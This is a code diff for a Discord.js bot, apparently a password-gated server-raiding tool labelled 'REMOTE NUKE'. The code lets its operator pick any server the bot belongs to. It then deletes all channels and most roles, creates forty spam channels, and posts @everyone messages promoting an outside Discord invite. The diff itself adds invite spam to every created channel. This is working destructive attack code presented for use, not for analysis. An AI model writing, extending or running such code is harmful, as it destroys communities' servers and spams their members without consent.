@@ -51,9 +51,7 @@ client.once('ready', () => {
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
 
-  const content = message.content.trim().toLowerCase();
-
-  if (content === '!fb') {
+  if (message.content.trim().toLowerCase() === '!fb') {
     const embed = new EmbedBuilder()
       .setColor('#ff0000')
       .setTitle('🔴 REMOTE NUKE')
@@ -68,59 +66,36 @@ client.on('messageCreate', async message => {
   }
 });
 
-// FIXED INTERACTIONS
+// INTERACTIONS
 client.on('interactionCreate', async interaction => {
   if (!interaction.customId) return;
 
   try {
     const userId = interaction.customId.split('_')[2];
-    if (interaction.user.id !== userId) {
-      return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
-    }
+    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
 
-    // Button → Modal
-    if (interaction.isButton()) {
-      const modal = new ModalBuilder()
-        .setCustomId(interaction.customId.replace('start', 'modal'))
-        .setTitle('Enter Password');
-
-      modal.addComponents(new ActionRowBuilder().addComponents(
-        new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
-      ));
-
+    if (interaction.isButton() && interaction.customId.startsWith('fb_start_')) {
+      const modal = new ModalBuilder().setCustomId(`fb_modal_${userId}`).setTitle('Enter Password');
+      modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)));
       return await interaction.showModal(modal);
     }
 
-    // Modal Submit
-    if (interaction.isModalSubmit()) {
+    if (interaction.isModalSubmit() && interaction.customId.startsWith('fb_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
+      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
 
-      if (password !== MAIN_PASSWORD) {
-        return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
-      }
-
-      // Server selector for nuke
       const servers = client.guilds.cache.map(g => ({
         label: g.name.length > 25 ? g.name.slice(0, 22) + '...' : g.name,
         value: g.id,
         description: `${g.memberCount} members`
       }));
 
-      const menu = new StringSelectMenuBuilder()
-        .setCustomId(`fb_server_${userId}`)
-        .setPlaceholder('Choose server to NUKE')
-        .addOptions(servers);
-
+      const menu = new StringSelectMenuBuilder().setCustomId(`fb_server_${userId}`).setPlaceholder('Choose server to NUKE').addOptions(servers);
       const row = new ActionRowBuilder().addComponents(menu);
 
-      await interaction.reply({
-        content: '✅ Password correct! Select server to nuke:',
-        components: [row],
-        ephemeral: true
-      });
+      await interaction.reply({ content: '✅ Password correct! Select server:', components: [row], ephemeral: true });
     }
 
-    // Nuke selected server
     if (interaction.isStringSelectMenu() && interaction.customId.startsWith('fb_server_')) {
       await interaction.deferUpdate();
 
@@ -129,33 +104,40 @@ client.on('interactionCreate', async interaction => {
 
       if (!guild) return interaction.followUp({ content: '❌ Server not found.', ephemeral: true });
 
-      await interaction.followUp({ content: `🔴 **RAIDING ${guild.name}** - Deleting everything...`, ephemeral: true });
+      const user = interaction.user;
+
+      await interaction.followUp({ content: `🔴 **RAIDING ${guild.name}** - Deleting channels...`, ephemeral: true });
 
       try {
-        // Delete channels
+        // Delete everything
         for (const channel of guild.channels.cache.values()) {
           await channel.delete().catch(() => {});
         }
 
-        // Delete roles
         for (const role of guild.roles.cache.values()) {
           if (role.name === '@everyone' || role.name === 'Owner') continue;
           await role.delete().catch(() => {});
         }
 
-        // Spam "ew" channels
-        for (let i = 0; i < 30; i++) {
-          await guild.channels.create({ name: 'ew', type: ChannelType.GuildText }).catch(() => {});
+        // SPAM CREATE CHANNELS + INVITE IN EVERY CHANNEL
+        for (let i = 0; i < 40; i++) {
+          const spamChannel = await guild.channels.create({
+            name: 'ew',
+            type: ChannelType.GuildText
+          }).catch(() => {});
+
+          if (spamChannel) {
+            const invite = await spamChannel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
+            if (invite) {
+              await spamChannel.send(`@everyone\nJoin fame unlocked: discord.gg/fameunlocked`).catch(() => {});
+            }
+          }
         }
 
-        const ewChannel = guild.channels.cache.find(c => c.name === 'ew');
-        if (ewChannel) {
-          const invite = await ewChannel.createInvite({ maxAge: 0, maxUses: 0 });
-          await ewChannel.send(`@everyone\nJoin fame unlocked: discord.gg/fameunlocked`);
-          await interaction.user.send(`✅ Raid finished on **${guild.name}**\nInvite: https://discord.gg/${invite.code}`);
-        }
+        // DM the user
+        await user.send(`✅ **Raid Finished on ${guild.name}**\nChannels spammed with invites!`);
 
-        await interaction.followUp({ content: `✅ **${guild.name}** fully nuked! Check your DMs.`, ephemeral: true });
+        await interaction.followUp({ content: `✅ **${guild.name}** fully nuked & spammed! Check your DMs.`, ephemeral: true });
       } catch (err) {
         console.error(err);
         await interaction.followUp({ content: '⚠️ Raid partially failed.', ephemeral: true });
@@ -164,7 +146,7 @@ client.on('interactionCreate', async interaction => {
   } catch (error) {
     console.error('Interaction Error:', error);
     if (!interaction.replied && !interaction.deferred) {
-      await interaction.reply({ content: '❌ Something went wrong. Try again.', ephemeral: true }).catch(() => {});
+      await interaction.reply({ content: '❌ Something went wrong.', ephemeral: true }).catch(() => {});
     }
   }
 });
